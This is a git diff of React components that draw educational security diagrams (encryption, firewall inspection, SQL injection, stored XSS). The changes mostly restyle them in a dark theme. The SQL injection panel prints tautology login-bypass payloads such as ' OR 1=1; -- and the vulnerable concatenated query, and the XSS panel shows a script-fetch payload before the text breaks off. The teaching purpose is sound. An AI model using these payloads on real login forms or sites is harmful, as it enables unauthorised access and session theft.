@@ -2,7 +2,7 @@
 
 import React, { useState } from 'react';
 import { cn } from '@/lib/utils';
-import { Shield, Lock, Cpu, Server, Database, Globe, AlertTriangle, CheckCircle, ArrowRight, Layers, FileCode, Search, Terminal, Eye } from 'lucide-react';
+import { Shield, Lock, Cpu, Server, Database, Globe, AlertTriangle, CheckCircle, ArrowRight, Layers, FileCode, Search, Terminal, Eye, Key } from 'lucide-react';
 
 // ==========================================
 // 1. Encryption & Decryption Cryptographic Flow Diagram
@@ -11,25 +11,25 @@ export const EncryptionFlowDiagram: React.FC<{ className?: string }> = ({ classN
   const [mode, setMode] = useState<'symmetric' | 'asymmetric'>('symmetric');
 
   return (
-    <div className={cn('p-6 md:p-8 rounded-3xl bg-[#FFFFFF] dark:bg-[#262E28] border border-[#DDE5DE] dark:border-[#3A4840] shadow-xs', className)}>
-      <div className="flex flex-wrap items-center justify-between gap-4 mb-6">
+    <div className={cn('p-6 md:p-8 rounded-2xl bg-[#0E1510] border border-[#1B2A1F] font-mono shadow-xs', className)}>
+      <div className="flex flex-wrap items-center justify-between gap-4 mb-6 pb-4 border-b border-[#1B2A1F]">
         <div>
-          <div className="text-xs font-bold uppercase tracking-wider text-[#3F7D5A] dark:text-[#6AAF8A] mb-1">
-            Visual Cryptographic Pipeline
+          <div className="text-xs font-bold uppercase tracking-wider text-[#00FF66] mb-1">
+            // CRYPTOGRAPHIC_PIPELINE
           </div>
-          <h3 className="text-lg md:text-xl font-black text-[#18221C] dark:text-[#E8F0EA]">
-            {mode === 'symmetric' ? 'Symmetric Cryptography (Shared Secret)' : 'Asymmetric Cryptography (Public / Private Key Pair)'}
+          <h3 className="text-base sm:text-lg font-black text-[#E8F5E9]">
+            {mode === 'symmetric' ? 'Symmetric Cryptography (AES-256-GCM Shared Key)' : 'Asymmetric Cryptography (RSA / ECC Public-Private Keypair)'}
           </h3>
         </div>
-        <div className="inline-flex rounded-xl p-1 bg-[#EEF3EE] dark:bg-[#202722] border border-[#DDE5DE] dark:border-[#3A4840]">
+        <div className="inline-flex rounded-xl p-1 bg-[#050705] border border-[#1B2A1F]">
           <button
             type="button"
             onClick={() => setMode('symmetric')}
             className={cn(
-              'px-3 py-1 rounded-lg text-xs font-bold transition-all',
+              'px-3 py-1.5 rounded-lg text-xs font-bold transition-all',
               mode === 'symmetric'
-                ? 'bg-[#3F7D5A] text-white shadow-xs'
-                : 'text-[#68736B] dark:text-[#A0AFA5] hover:text-[#18221C]'
+                ? 'bg-[#00FF66] text-[#050705] shadow-xs'
+                : 'text-[#91A596] hover:text-[#E8F5E9]'
             )}
           >
             Symmetric (AES-256)
@@ -38,10 +38,10 @@ export const EncryptionFlowDiagram: React.FC<{ className?: string }> = ({ classN
             type="button"
             onClick={() => setMode('asymmetric')}
             className={cn(
-              'px-3 py-1 rounded-lg text-xs font-bold transition-all',
+              'px-3 py-1.5 rounded-lg text-xs font-bold transition-all',
               mode === 'asymmetric'
-                ? 'bg-[#3F7D5A] text-white shadow-xs'
-                : 'text-[#68736B] dark:text-[#A0AFA5] hover:text-[#18221C]'
+                ? 'bg-[#00FF66] text-[#050705] shadow-xs'
+                : 'text-[#91A596] hover:text-[#E8F5E9]'
             )}
           >
             Asymmetric (RSA / ECC)
@@ -52,76 +52,76 @@ export const EncryptionFlowDiagram: React.FC<{ className?: string }> = ({ classN
       {/* Interactive Process Pipeline */}
       <div className="grid grid-cols-1 lg:grid-cols-5 gap-3 items-center">
         {/* Step 1: Plaintext Input */}
-        <div className="p-4 rounded-2xl bg-[#EEF3EE] dark:bg-[#202722] border border-[#DDE5DE] dark:border-[#3A4840] text-center">
-          <div className="w-10 h-10 mx-auto rounded-xl bg-white dark:bg-[#262E28] flex items-center justify-center text-[#3F7D5A] dark:text-[#6AAF8A] mb-2 shadow-xs">
+        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F] text-center">
+          <div className="w-10 h-10 mx-auto rounded-lg bg-[#0E1510] border border-[#1B2A1F] flex items-center justify-center text-[#00FF66] mb-2 shadow-xs">
             <FileCode className="w-5 h-5" />
           </div>
-          <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-[#68736B] dark:text-[#A0AFA5] block">
-            Step 1
+          <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-[#91A596] block">
+            STEP 01
           </span>
-          <h4 className="text-sm font-bold text-[#18221C] dark:text-[#E8F0EA] mb-1">Plaintext</h4>
-          <p className="font-mono text-[11px] bg-white dark:bg-[#262E28] p-1.5 rounded-lg border border-[#DDE5DE] dark:border-[#3A4840] text-[#18221C] dark:text-[#E8F0EA] truncate">
-            "CONFIDENTIAL_PAYLOAD"
+          <h4 className="text-xs font-bold text-[#E8F5E9] mt-0.5">Plaintext (P)</h4>
+          <p className="text-[11px] text-[#91A596] mt-1 font-sans">
+            Unencrypted data payload: &quot;CONFIDENTIAL_KEY&quot;
           </p>
         </div>
 
-        {/* Arrow + Key 1 */}
-        <div className="p-4 rounded-2xl bg-[#FDF6E7] dark:bg-[#2A261E] border border-[#F2E5C9] dark:border-[#524426] text-center">
-          <div className="w-10 h-10 mx-auto rounded-xl bg-white dark:bg-[#262E28] flex items-center justify-center text-[#D7A84B] mb-2 shadow-xs">
+        {/* Step 2: Encryption Engine */}
+        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F] text-center">
+          <div className="w-10 h-10 mx-auto rounded-lg bg-[#0E1510] border border-[#00FF66] flex items-center justify-center text-[#00FF66] mb-2 shadow-xs">
             <Lock className="w-5 h-5" />
           </div>
-          <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-[#A67B2E] dark:text-[#E4BF74] block">
-            Cipher Key
+          <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-[#00FF66] block">
+            STEP 02: ENCRYPT
           </span>
-          <h4 className="text-sm font-bold text-[#18221C] dark:text-[#E8F0EA] mb-1">
-            {mode === 'symmetric' ? 'Shared Secret Key' : "Recipient's Public Key"}
+          <h4 className="text-xs font-bold text-[#E8F5E9] mt-0.5">
+            {mode === 'symmetric' ? 'Cipher & Secret Key' : 'Receiver Public Key'}
           </h4>
-          <span className="text-[10px] font-mono text-[#68736B] dark:text-[#A0AFA5]">
-            {mode === 'symmetric' ? '256-bit AES Key' : 'Public Encryption'}
-          </span>
+          <p className="text-[10px] text-[#00FF66] mt-1">
+            {mode === 'symmetric' ? 'AES-256 + IV Vector' : 'RSA-4096 / Ed25519'}
+          </p>
         </div>
 
-        {/* Step 3: Ciphertext */}
-        <div className="p-4 rounded-2xl bg-[#FCEAEA] dark:bg-[#2E1E1E] border border-[#F7CDCD] dark:border-[#5C2424] text-center">
-          <div className="w-10 h-10 mx-auto rounded-xl bg-white dark:bg-[#262E28] flex items-center justify-center text-[#B84040] mb-2 shadow-xs">
+        {/* Step 3: Ciphertext in Transit */}
+        <div className="p-4 rounded-xl bg-[#271211] border border-[#441E1C] text-center">
+          <div className="w-10 h-10 mx-auto rounded-lg bg-[#050705] border border-[#FF3B30] flex items-center justify-center text-[#FF3B30] mb-2 shadow-xs">
             <Shield className="w-5 h-5" />
           </div>
-          <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-[#B84040] block">
-            Encrypted
+          <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-[#FF3B30] block">
+            STEP 03: TRANSIT
           </span>
-          <h4 className="text-sm font-bold text-[#18221C] dark:text-[#E8F0EA] mb-1">Ciphertext</h4>
-          <p className="font-mono text-[10px] bg-white dark:bg-[#262E28] p-1.5 rounded-lg border border-[#DDE5DE] dark:border-[#3A4840] text-[#B84040] truncate">
-            0x9F4C2A88...#E9B1
+          <h4 className="text-xs font-bold text-[#E8F5E9] mt-0.5">Ciphertext (C)</h4>
+          <p className="text-[10px] font-mono text-[#FF3B30] mt-1 break-all">
+            9f83e20ab47c...
           </p>
         </div>
 
-        {/* Arrow + Key 2 */}
-        <div className="p-4 rounded-2xl bg-[#FDF2EA] dark:bg-[#2C211B] border border-[#F8DCB8] dark:border-[#583925] text-center">
-          <div className="w-10 h-10 mx-auto rounded-xl bg-white dark:bg-[#262E28] flex items-center justify-center text-[#E58A4E] mb-2 shadow-xs">
-            <Lock className="w-5 h-5" />
+        {/* Step 4: Decryption Engine */}
+        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F] text-center">
+          <div className="w-10 h-10 mx-auto rounded-lg bg-[#0E1510] border border-[#00FF66] flex items-center justify-center text-[#00FF66] mb-2 shadow-xs">
+            <Key className="w-5 h-5" />
           </div>
-          <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-[#C97438] block">
-            Decryption Key
+          <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-[#00FF66] block">
+            STEP 04: DECRYPT
           </span>
-          <h4 className="text-sm font-bold text-[#18221C] dark:text-[#E8F0EA] mb-1">
-            {mode === 'symmetric' ? 'Same Secret Key' : "Recipient's Private Key"}
+          <h4 className="text-xs font-bold text-[#E8F5E9] mt-0.5">
+            {mode === 'symmetric' ? 'Shared Secret Key' : 'Receiver Private Key'}
           </h4>
-          <span className="text-[10px] font-mono text-[#68736B] dark:text-[#A0AFA5]">
-            {mode === 'symmetric' ? 'Inverted S-Box' : 'Kept Strictly Secret'}
-          </span>
+          <p className="text-[10px] text-[#00FF66] mt-1">
+            {mode === 'symmetric' ? 'Inverse Substitution' : 'Private Key Math'}
+          </p>
         </div>
 
-        {/* Step 5: Decrypted Plaintext */}
-        <div className="p-4 rounded-2xl bg-[#EBF4EF] dark:bg-[#1E2B23] border border-[#DDE5DE] dark:border-[#3A4840] text-center">
-          <div className="w-10 h-10 mx-auto rounded-xl bg-white dark:bg-[#262E28] flex items-center justify-center text-[#3F7D5A] dark:text-[#6AAF8A] mb-2 shadow-xs">
+        {/* Step 5: Plaintext Verified */}
+        <div className="p-4 rounded-xl bg-[#0D2214] border border-[#1B2A1F] text-center">
+          <div className="w-10 h-10 mx-auto rounded-lg bg-[#050705] border border-[#00FF66] flex items-center justify-center text-[#00FF66] mb-2 shadow-xs">
             <CheckCircle className="w-5 h-5" />
           </div>
-          <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-[#3F7D5A] dark:text-[#6AAF8A] block">
-            Verified
+          <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-[#00FF66] block">
+            STEP 05: SUCCESS
           </span>
-          <h4 className="text-sm font-bold text-[#18221C] dark:text-[#E8F0EA] mb-1">Plaintext</h4>
-          <p className="font-mono text-[11px] bg-white dark:bg-[#262E28] p-1.5 rounded-lg border border-[#DDE5DE] dark:border-[#3A4840] text-[#18221C] dark:text-[#E8F0EA] truncate">
-            "CONFIDENTIAL_PAYLOAD"
+          <h4 className="text-xs font-bold text-[#E8F5E9] mt-0.5">Original Plaintext</h4>
+          <p className="text-[11px] text-[#00FF66] font-bold mt-1">
+            CONFIDENTIALITY PRESERVED
           </p>
         </div>
       </div>
@@ -130,127 +130,121 @@ export const EncryptionFlowDiagram: React.FC<{ className?: string }> = ({ classN
 };
 
 // ==========================================
-// 2. Firewall Packet & Application Layer Inspection Flow
+// 2. Firewall Multi-Layer Inspection Pipeline
 // ==========================================
 export const FirewallInspectionDiagram: React.FC<{ className?: string }> = ({ className }) => {
   return (
-    <div className={cn('p-6 md:p-8 rounded-3xl bg-[#FFFFFF] dark:bg-[#262E28] border border-[#DDE5DE] dark:border-[#3A4840] shadow-xs', className)}>
-      <div className="mb-6">
-        <div className="text-xs font-bold uppercase tracking-wider text-[#3F7D5A] dark:text-[#6AAF8A] mb-1">
-          Defensive Boundary Architecture
+    <div className={cn('p-6 md:p-8 rounded-2xl bg-[#0E1510] border border-[#1B2A1F] font-mono shadow-xs', className)}>
+      <div className="mb-6 pb-4 border-b border-[#1B2A1F]">
+        <div className="text-xs font-bold uppercase tracking-wider text-[#00FF66] mb-1">
+          // DEFENSIVE_PERIMETER_PIPELINE
         </div>
-        <h3 className="text-lg md:text-xl font-black text-[#18221C] dark:text-[#E8F0EA]">
-          Multi-Layer Firewall Packet Inspection Engine
+        <h3 className="text-base sm:text-lg font-black text-[#E8F5E9]">
+          Firewall Multi-Tier Packet Inspection Lifecycle
         </h3>
-        <p className="text-xs text-[#68736B] dark:text-[#A0AFA5] mt-1 max-w-2xl">
-          Visualizing how packets pass through Layer 3/4 stateful tracking and Layer 7 Next-Gen Application inspection filters.
+        <p className="text-xs text-[#91A596] mt-1 font-sans">
+          Tracing inbound untrusted packets through Layer 3/4 stateful filters, Layer 7 deep packet inspection (NGFW), and DMZ isolation.
         </p>
       </div>
 
-      <div className="grid grid-cols-1 lg:grid-cols-4 gap-4 items-stretch">
-        {/* Stage 1: Incoming Ingress */}
-        <div className="p-5 rounded-2xl bg-[#EEF3EE] dark:bg-[#202722] border border-[#DDE5DE] dark:border-[#3A4840] flex flex-col justify-between">
+      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
+        {/* Stage 1: Ingress Untrusted Packets */}
+        <div className="p-5 rounded-xl bg-[#050705] border border-[#1B2A1F] flex flex-col justify-between">
           <div>
             <div className="flex items-center justify-between mb-3">
-              <span className="text-[10px] font-mono font-bold uppercase tracking-wider px-2 py-0.5 rounded-md bg-white dark:bg-[#262E28] text-[#18221C] dark:text-[#E8F0EA]">
-                Ingress Packets
+              <span className="text-[10px] font-mono font-bold uppercase tracking-wider px-2 py-0.5 rounded bg-[#0E1510] border border-[#1B2A1F] text-[#91A596]">
+                STAGE 01: INGRESS
               </span>
-              <Globe className="w-4 h-4 text-[#3F7D5A]" />
+              <Globe className="w-4 h-4 text-[#91A596]" />
             </div>
-            <h4 className="text-sm font-bold text-[#18221C] dark:text-[#E8F0EA] mb-2">Public Internet Traffic</h4>
-            <div className="space-y-1.5 font-mono text-[11px]">
-              <div className="p-2 rounded-lg bg-white dark:bg-[#262E28] border border-[#DDE5DE] dark:border-[#3A4840] flex items-center justify-between">
-                <span>TCP :443 HTTPS</span>
-                <span className="text-[#3F7D5A] font-bold">Valid</span>
-              </div>
-              <div className="p-2 rounded-lg bg-white dark:bg-[#262E28] border border-[#DDE5DE] dark:border-[#3A4840] flex items-center justify-between">
-                <span>TCP :23 TELNET</span>
-                <span className="text-[#B84040] font-bold">Risky</span>
-              </div>
-              <div className="p-2 rounded-lg bg-white dark:bg-[#262E28] border border-[#DDE5DE] dark:border-[#3A4840] flex items-center justify-between">
-                <span>UDP :1900 SSDP</span>
-                <span className="text-[#E58A4E] font-bold">Flood</span>
-              </div>
-            </div>
+            <h4 className="text-sm font-bold text-[#E8F5E9] mb-2">Public Internet Traffic</h4>
+            <p className="text-xs text-[#91A596] leading-relaxed font-sans mb-3">
+              Raw IP packets arrive at network edge router containing SYN requests, malicious scans, and normal user HTTP/HTTPS requests.
+            </p>
+          </div>
+          <div className="p-2 rounded-lg bg-[#271211] border border-[#441E1C] text-center">
+            <span className="text-[10px] font-mono font-bold text-[#FF3B30]">
+              STATUS: UNTRUSTED / UNFILTERED
+            </span>
           </div>
         </div>
 
-        {/* Stage 2: Layer 3/4 Packet Filtering */}
-        <div className="p-5 rounded-2xl bg-[#FDF6E7] dark:bg-[#2A261E] border border-[#F2E5C9] dark:border-[#524426] flex flex-col justify-between">
+        {/* Stage 2: Layer 3/4 Stateful Inspection */}
+        <div className="p-5 rounded-xl bg-[#050705] border border-[#1B2A1F] flex flex-col justify-between">
           <div>
             <div className="flex items-center justify-between mb-3">
-              <span className="text-[10px] font-mono font-bold uppercase tracking-wider px-2 py-0.5 rounded-md bg-white dark:bg-[#262E28] text-[#A67B2E]">
-                Layer 3 / 4 Filter
+              <span className="text-[10px] font-mono font-bold uppercase tracking-wider px-2 py-0.5 rounded bg-[#241C0E] border border-[#382B17] text-[#D9A441]">
+                STAGE 02: L3/L4 STATEFUL
               </span>
-              <Layers className="w-4 h-4 text-[#D7A84B]" />
+              <Cpu className="w-4 h-4 text-[#D9A441]" />
             </div>
-            <h4 className="text-sm font-bold text-[#18221C] dark:text-[#E8F0EA] mb-2">Stateful Table Check</h4>
-            <ul className="text-xs text-[#68645D] dark:text-[#A0AFA5] space-y-2">
+            <h4 className="text-sm font-bold text-[#E8F5E9] mb-2">Stateful Connection Tracking</h4>
+            <ul className="text-xs text-[#91A596] space-y-1.5 font-sans">
               <li className="flex items-start gap-1.5">
-                <span className="text-[#3F7D5A] font-bold mt-0.5">+</span>
-                <span>Source/Destination IP matching</span>
+                <span className="text-[#00FF66] font-bold">+</span>
+                <span>Check TCP 3-way handshake state table</span>
               </li>
               <li className="flex items-start gap-1.5">
-                <span className="text-[#3F7D5A] font-bold mt-0.5">+</span>
-                <span>TCP 3-Way Handshake validation</span>
+                <span className="text-[#00FF66] font-bold">+</span>
+                <span>Match Source / Dest IP ACL rules</span>
               </li>
               <li className="flex items-start gap-1.5">
-                <span className="text-[#B84040] font-bold mt-0.5">-</span>
-                <span className="text-[#B84040]">DROP Telnet & unregistered ports</span>
+                <span className="text-[#FF3B30] font-bold">-</span>
+                <span className="text-[#FF3B30]">DROP invalid TCP flags (SYN-FIN)</span>
               </li>
             </ul>
           </div>
-          <div className="mt-4 pt-3 border-t border-[#F2E5C9] dark:border-[#524426] text-[10px] font-mono text-[#A67B2E]">
-            Connection state: ESTABLISHED
+          <div className="mt-4 pt-2 border-t border-[#1B2A1F] text-[10px] text-[#D9A441]">
+            CONN_STATE: ESTABLISHED
           </div>
         </div>
 
         {/* Stage 3: Layer 7 Next-Gen Application Inspection (WAF / IPS) */}
-        <div className="p-5 rounded-2xl bg-[#FDF2EA] dark:bg-[#2C211B] border border-[#F8DCB8] dark:border-[#583925] flex flex-col justify-between">
+        <div className="p-5 rounded-xl bg-[#050705] border border-[#1B2A1F] flex flex-col justify-between">
           <div>
             <div className="flex items-center justify-between mb-3">
-              <span className="text-[10px] font-mono font-bold uppercase tracking-wider px-2 py-0.5 rounded-md bg-white dark:bg-[#262E28] text-[#C97438]">
-                Layer 7 NGFW / WAF
+              <span className="text-[10px] font-mono font-bold uppercase tracking-wider px-2 py-0.5 rounded bg-[#271211] border border-[#441E1C] text-[#FF3B30]">
+                STAGE 03: L7 NGFW / WAF
               </span>
-              <Shield className="w-4 h-4 text-[#E58A4E]" />
+              <Shield className="w-4 h-4 text-[#FF3B30]" />
             </div>
-            <h4 className="text-sm font-bold text-[#18221C] dark:text-[#E8F0EA] mb-2">Deep Packet Inspection (DPI)</h4>
-            <ul className="text-xs text-[#68645D] dark:text-[#A0AFA5] space-y-2">
+            <h4 className="text-sm font-bold text-[#E8F5E9] mb-2">Deep Packet Inspection (DPI)</h4>
+            <ul className="text-xs text-[#91A596] space-y-1.5 font-sans">
               <li className="flex items-start gap-1.5">
-                <span className="text-[#3F7D5A] font-bold mt-0.5">+</span>
-                <span>TLS Decryption & Cert analysis</span>
+                <span className="text-[#00FF66] font-bold">+</span>
+                <span>TLS Decryption &amp; Cert analysis</span>
               </li>
               <li className="flex items-start gap-1.5">
-                <span className="text-[#B84040] font-bold mt-0.5">-</span>
-                <span className="text-[#B84040]">BLOCK SQLi / XSS HTTP payloads</span>
+                <span className="text-[#FF3B30] font-bold">-</span>
+                <span className="text-[#FF3B30]">BLOCK SQLi / XSS HTTP payloads</span>
               </li>
               <li className="flex items-start gap-1.5">
-                <span className="text-[#3F7D5A] font-bold mt-0.5">+</span>
-                <span>Signature & Antivirus streaming scan</span>
+                <span className="text-[#00FF66] font-bold">+</span>
+                <span>Signature &amp; Antivirus streaming scan</span>
               </li>
             </ul>
           </div>
-          <div className="mt-4 pt-3 border-t border-[#F8DCB8] dark:border-[#583925] text-[10px] font-mono text-[#C97438]">
-            Threat signature: Clean
+          <div className="mt-4 pt-2 border-t border-[#1B2A1F] text-[10px] text-[#00FF66]">
+            SIGNATURE: CLEAN
           </div>
         </div>
 
         {/* Stage 4: Protected Corporate Network */}
-        <div className="p-5 rounded-2xl bg-[#EBF4EF] dark:bg-[#1E2B23] border border-[#DDE5DE] dark:border-[#3A4840] flex flex-col justify-between">
+        <div className="p-5 rounded-xl bg-[#0D2214] border border-[#1B2A1F] flex flex-col justify-between">
           <div>
             <div className="flex items-center justify-between mb-3">
-              <span className="text-[10px] font-mono font-bold uppercase tracking-wider px-2 py-0.5 rounded-md bg-white dark:bg-[#262E28] text-[#3F7D5A]">
-                Egress / Internal
+              <span className="text-[10px] font-mono font-bold uppercase tracking-wider px-2 py-0.5 rounded bg-[#050705] text-[#00FF66]">
+                STAGE 04: INTERNAL
               </span>
-              <Server className="w-4 h-4 text-[#3F7D5A]" />
+              <Server className="w-4 h-4 text-[#00FF66]" />
             </div>
-            <h4 className="text-sm font-bold text-[#18221C] dark:text-[#E8F0EA] mb-2">Protected LAN & Services</h4>
-            <p className="text-xs text-[#68645D] dark:text-[#A0AFA5] leading-relaxed mb-3">
+            <h4 className="text-sm font-bold text-[#E8F5E9] mb-2">Protected LAN &amp; Workloads</h4>
+            <p className="text-xs text-[#91A596] leading-relaxed font-sans mb-3">
               Only scrubbed, authenticated packets arrive at backend app containers and internal database clusters.
             </p>
           </div>
-          <div className="p-2 rounded-xl bg-white dark:bg-[#262E28] border border-[#DDE5DE] dark:border-[#3A4840] text-center">
-            <span className="text-xs font-mono font-bold text-[#3F7D5A] dark:text-[#6AAF8A]">
+          <div className="p-2 rounded-lg bg-[#050705] border border-[#1B2A1F] text-center">
+            <span className="text-xs font-mono font-bold text-[#00FF66]">
               ZERO UNFILTERED ACCESS
             </span>
           </div>
@@ -265,61 +259,50 @@ export const FirewallInspectionDiagram: React.FC<{ className?: string }> = ({ cl
 // ==========================================
 export const SqlInjectionAttackFlow: React.FC<{ className?: string }> = ({ className }) => {
   return (
-    <div className={cn('p-6 md:p-8 rounded-3xl bg-[#FFFFFF] dark:bg-[#262E28] border border-[#DDE5DE] dark:border-[#3A4840] shadow-xs', className)}>
-      <div className="mb-6">
-        <div className="text-xs font-bold uppercase tracking-wider text-[#B84040] dark:text-[#E07A7A] mb-1">
-          Technical Attack Execution Walkthrough
+    <div className={cn('p-6 md:p-8 rounded-2xl bg-[#0E1510] border border-[#1B2A1F] font-mono shadow-xs', className)}>
+      <div className="mb-6 pb-4 border-b border-[#1B2A1F]">
+        <div className="text-xs font-bold uppercase tracking-wider text-[#FF3B30] mb-1">
+          // ATTACK_VECTOR_DECONSTRUCTION
         </div>
-        <h3 className="text-lg md:text-xl font-black text-[#18221C] dark:text-[#E8F0EA]">
-          SQL Injection (SQLi) Tautology Execution Flow
+        <h3 className="text-base sm:text-lg font-black text-[#E8F5E9]">
+          SQL Injection Tautology &amp; Authentication Bypass Flow
         </h3>
-        <p className="text-xs text-[#68736B] dark:text-[#A0AFA5] mt-1 max-w-2xl">
-          How untrusted input in unsanitized SQL concatenation breaks query syntax logic and forces full database authorization bypass.
+        <p className="text-xs text-[#91A596] mt-1 font-sans">
+          Step-by-step breakdown of how unvalidated input alters the intended database query structure.
         </p>
       </div>
 
-      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
-        {/* Step 1 */}
-        <div className="p-4.5 rounded-2xl bg-[#EEF3EE] dark:bg-[#202722] border border-[#DDE5DE] dark:border-[#3A4840]">
-          <span className="text-[10px] font-mono font-bold uppercase px-2 py-0.5 rounded bg-white dark:bg-[#262E28] text-[#18221C] dark:text-[#E8F0EA]">
-            Phase 1: Input Piercing
-          </span>
-          <h4 className="text-sm font-bold text-[#18221C] dark:text-[#E8F0EA] mt-2 mb-1">Crafted Adversary Payload</h4>
-          <p className="text-xs text-[#68736B] dark:text-[#A0AFA5] mb-3">
-            Attacker submits payload with quote delimiter into the login username field:
+      <div className="grid grid-cols-1 md:grid-cols-3 gap-4 items-stretch">
+        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F]">
+          <span className="text-[10px] text-[#00FF66] block mb-1">PHASE 01</span>
+          <h4 className="text-xs font-bold text-[#E8F5E9] mb-2">Adversary Injects Payload</h4>
+          <p className="text-xs text-[#91A596] font-sans mb-3">
+            Attacker enters a crafted string containing quotes and boolean logic into the login username field:
           </p>
-          <div className="font-mono text-xs p-2.5 rounded-xl bg-white dark:bg-[#181C1A] border border-[#DDE5DE] dark:border-[#3A4840] text-[#B84040]">
-            admin' OR '1'='1' --
+          <div className="p-2.5 rounded-lg bg-[#0E1510] border border-[#FF3B30] text-[#FF3B30] text-xs font-mono">
+            &apos; OR 1=1; --
           </div>
         </div>
 
-        {/* Step 2 */}
-        <div className="p-4.5 rounded-2xl bg-[#FDF2EA] dark:bg-[#2C211B] border border-[#F8DCB8] dark:border-[#583925]">
-          <span className="text-[10px] font-mono font-bold uppercase px-2 py-0.5 rounded bg-white dark:bg-[#262E28] text-[#C97438]">
-            Phase 2: Vulnerable Concatenation
-          </span>
-          <h4 className="text-sm font-bold text-[#18221C] dark:text-[#E8F0EA] mt-2 mb-1">SQL Query Mutation</h4>
-          <p className="text-xs text-[#68736B] dark:text-[#A0AFA5] mb-3">
-            Web application builds query string using string formatting without parameterized prepared statements:
+        <div className="p-4 rounded-xl bg-[#050705] border border-[#1B2A1F]">
+          <span className="text-[10px] text-[#D9A441] block mb-1">PHASE 02</span>
+          <h4 className="text-xs font-bold text-[#E8F5E9] mb-2">Backend Query Concatenation</h4>
+          <p className="text-xs text-[#91A596] font-sans mb-3">
+            Vulnerable PHP/Node backend concatenates input directly without parameterized prepared statements:
           </p>
-          <div className="font-mono text-[11px] p-2.5 rounded-xl bg-white dark:bg-[#181C1A] border border-[#F8DCB8] dark:border-[#583925] text-[#18221C] dark:text-[#E8F0EA] leading-relaxed">
-            SELECT * FROM users WHERE user = '<span className="text-[#B84040] font-bold">admin' OR '1'='1</span>' -- AND pass = '...';
+          <div className="p-2.5 rounded-lg bg-[#0E1510] border border-[#1B2A1F] text-[#91A596] text-[11px] font-mono leading-relaxed">
+            SELECT * FROM users WHERE user = <span className="text-[#FF3B30] font-bold">&apos;&apos; OR 1=1; --</span>
           </div>
         </div>
 
-        {/* Step 3 */}
-        <div className="p-4.5 rounded-2xl bg-[#FCEAEA] dark:bg-[#2E1E1E] border border-[#F7CDCD] dark:border-[#5C2424]">
-          <span className="text-[10px] font-mono font-bold uppercase px-2 py-0.5 rounded bg-white dark:bg-[#262E28] text-[#B84040]">
-            Phase 3: Database Compromise
-          </span>
-          <h4 className="text-sm font-bold text-[#18221C] dark:text-[#E8F0EA] mt-2 mb-1">Tautology Evaluation</h4>
-          <p className="text-xs text-[#68736B] dark:text-[#A0AFA5] mb-3">
-            Since <code className="font-mono text-[#B84040]">'1'='1'</code> is always true, the WHERE clause succeeds and comments ignore the password check.
+        <div className="p-4 rounded-xl bg-[#271211] border border-[#441E1C]">
+          <span className="text-[10px] text-[#FF3B30] block mb-1">PHASE 03</span>
+          <h4 className="text-xs font-bold text-[#FF3B30] mb-2">Tautology Bypass Execution</h4>
+          <p className="text-xs text-[#91A596] font-sans mb-3">
+            Because <code className="text-[#00FF66]">1=1</code> is always true, the SQL engine returns the first admin user and comments out the password check.
           </p>
-          <div className="p-2.5 rounded-xl bg-white dark:bg-[#181C1A] border border-[#F7CDCD] dark:border-[#5C2424] text-center">
-            <span className="text-xs font-bold text-[#B84040]">
-              AUTHENTICATION BYPASS EXPLOITED
-            </span>
+          <div className="p-2.5 rounded-lg bg-[#050705] border border-[#FF3B30] text-[#FF3B30] text-xs font-mono text-center font-bold">
+            AUTH BYPASS: ADMIN ACCESS
           </div>
         </div>
       </div>
@@ -328,53 +311,53 @@ export const SqlInjectionAttackFlow: React.FC<{ className?: string }> = ({ class
 };
 
 // ==========================================
-// 4. Attack Lifecycle: Cross-Site Scripting (XSS) Flow
+// 4. Attack Lifecycle: Stored XSS Flow
 // ==========================================
 export const XssAttackFlow: React.FC<{ className?: string }> = ({ className }) => {
   return (
-    <div className={cn('p-6 md:p-8 rounded-3xl bg-[#FFFFFF] dark:bg-[#262E28] border border-[#DDE5DE] dark:border-[#3A4840] shadow-xs', className)}>
-      <div className="mb-6">
-        <div className="text-xs font-bold uppercase tracking-wider text-[#E58A4E] dark:text-[#EDA574] mb-1">
-          Client-Side Web Exploit
+    <div className={cn('p-6 md:p-8 rounded-2xl bg-[#0E1510] border border-[#1B2A1F] font-mono shadow-xs', className)}>
+      <div className="mb-6 pb-4 border-b border-[#1B2A1F]">
+        <div className="text-xs font-bold uppercase tracking-wider text-[#D9A441] mb-1">
+          // CLIENT_SIDE_EXPLOITATION
         </div>
-        <h3 className="text-lg md:text-xl font-black text-[#18221C] dark:text-[#E8F0EA]">
+        <h3 className="text-base sm:text-lg font-black text-[#E8F5E9]">
           Stored Cross-Site Scripting (XSS) Session Hijacking Flow
         </h3>
-        <p className="text-xs text-[#68736B] dark:text-[#A0AFA5] mt-1 max-w-2xl">
-          Visualizing how malicious JavaScript stored in a database executes in legitimate victim browsers to steal authentication session tokens.
+        <p className="text-xs text-[#91A596] mt-1 font-sans">
+          How persistent JavaScript payloads in comments compromise innocent user sessions.
         </p>
       </div>
 
-      <div className="grid grid-cols-1 md:grid-cols-4 gap-3 items-center">
-        <div className="p-4 rounded-2xl bg-[#EEF3EE] dark:bg-[#202722] border border-[#DDE5DE] dark:border-[#3A4840] text-center">
-          <span className="text-[10px] font-mono font-bold uppercase text-[#68736B] dark:text-[#A0AFA5] block mb-1">Step 1</span>
-          <h4 className="text-xs font-bold text-[#18221C] dark:text-[#E8F0EA] mb-1">Payload Injected</h4>
-          <p className="font-mono text-[10px] text-[#B84040] bg-white dark:bg-[#262E28] p-1.5 rounded-lg border border-[#DDE5DE] dark:border-[#3A4840] truncate">
-            &lt;script&gt;fetch(...)&lt;/script&gt;
+      <div className="grid grid-cols-1 md:grid-cols-4 gap-3 items-stretch">
+        <div className="p-3.5 rounded-xl bg-[#050705] border border-[#1B2A1F]">
